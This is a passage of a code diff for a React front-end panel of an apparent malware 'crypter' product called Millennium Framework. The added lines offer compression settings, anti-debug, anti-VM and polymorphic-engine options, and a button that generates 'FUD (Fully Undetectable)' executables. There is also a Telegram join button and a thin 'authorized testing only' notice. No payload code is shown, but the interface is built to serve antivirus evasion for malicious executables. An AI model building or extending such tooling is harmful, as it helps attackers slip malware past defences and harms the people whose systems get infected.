+                    <Select 
+                      value={crypterConfig.compressionLevel} 
+                      onValueChange={(value) => setCrypterConfig(prev => ({ ...prev, compressionLevel: value }))}
+                    >
+                      <SelectTrigger className="bg-gray-800 border-gray-600 text-white">
+                        <SelectValue />
+                      </SelectTrigger>
+                      <SelectContent>
+                        <SelectItem value="low">Low (Fast)</SelectItem>
+                        <SelectItem value="medium">Medium</SelectItem>
+                        <SelectItem value="high">High (Best)</SelectItem>
+                      </SelectContent>
+                    </Select>
+                  </div>
+                </div>
+
+                <div className="space-y-4">
+                  <h3 className="text-lg font-semibold text-cyan-400">Protection Features</h3>
+                  
+                  <div className="space-y-3">
+                    <label className="flex items-center space-x-3">
+                      <input
+                        type="checkbox"
+                        checked={crypterConfig.antiDebug}
+                        onChange={(e) => setCrypterConfig(prev => ({ ...prev, antiDebug: e.target.checked }))}
+                        className="w-4 h-4 text-cyan-600 rounded"
+                      />
+                      <span className="text-gray-300">Anti-Debug Protection</span>
+                    </label>
+
+                    <label className="flex items-center space-x-3">
+                      <input
+                        type="checkbox"
+                        checked={crypterConfig.antiVM}
+                        onChange={(e) => setCrypterConfig(prev => ({ ...prev, antiVM: e.target.checked }))}
+                        className="w-4 h-4 text-cyan-600 rounded"
+                      />
+                      <span className="text-gray-300">Anti-VM Detection</span>
+                    </label>
+
+                    <label className="flex items-center space-x-3">
+                      <input
+                        type="checkbox"
+                        checked={crypterConfig.polymorphic}
+                        onChange={(e) => setCrypterConfig(prev => ({ ...prev, polymorphic: e.target.checked }))}
+                        className="w-4 h-4 text-cyan-600 rounded"
+                      />
+                      <span className="text-gray-300">Polymorphic Engine</span>
+                    </label>
+
+                    <label className="flex items-center space-x-3">
+                      <input
+                        type="checkbox"
+                        checked={crypterConfig.dotNetSupport}
+                        onChange={(e) => setCrypterConfig(prev => ({ ...prev, dotNetSupport: e.target.checked }))}
+                        className="w-4 h-4 text-cyan-600 rounded"
+                      />
+                      <span className="text-gray-300">.NET Assembly Support</span>
+                    </label>
+                  </div>
+
+                  <Button
+                    onClick={handleCrypterSubmit}
+                    disabled={crypterProcessor.isPending || !crypterConfig.inputFile}
+                    className="w-full bg-cyan-600 hover:bg-cyan-700 mt-4"
+                  >
+                    <Package className="w-4 h-4 mr-2" />
+                    {crypterProcessor.isPending ? 'Processing...' : 'Generate Protected Executable'}
+                  </Button>
+                </div>
+              </div>
+
+              <Alert className="mt-6 border-yellow-500/30 bg-yellow-500/10">
+                <Shield className="h-4 w-4" />
+                <AlertDescription className="text-yellow-200">
+                  <strong>Security Notice:</strong> This crypter generates FUD (Fully Undetectable) executables. 
+                  Use only for authorized penetration testing and security research.
+                </AlertDescription>
+              </Alert>
+            </CardContent>
+          </Card>
+        </section>
+
+        {/* Footer */}
+        <footer className="text-center py-8 border-t border-gray-700">
+          <div className="flex items-center justify-center space-x-6 mb-4">
+            <Button variant="outline" className="border-cyan-500 text-cyan-400">
+              <Send className="w-4 h-4 mr-2" />
+              Join Telegram
+            </Button>
+            <Badge variant="outline" className="border-cyan-500 text-cyan-400">
+              Version 4.0 - Professional Edition
+            </Badge>
+          </div>
+          <p className="text-gray-400 text-sm">
+            © 2025 Millennium Framework. For authorized cybersecurity research only.
+          </p>
         </footer>
       </div>
 
-      <div className="disclaimer">
-        ⚠️ DISCLAIMER: I AM NOT RESPONSIBLE FOR ANY ILLEGAL USAGE OF THESE TOOLS ⚠️
-      </div>
-
-      <CookieBanner />
       <AdminLoginModal 
-        isOpen={showAdminLogin} 
-        onClose={() => setShowAdminLogin(false)} 
+        isOpen={showAdminModal} 
+        onClose={() => setShowAdminModal(false)} 
       />
+      <CookieBanner />
     </div>
   );
 }
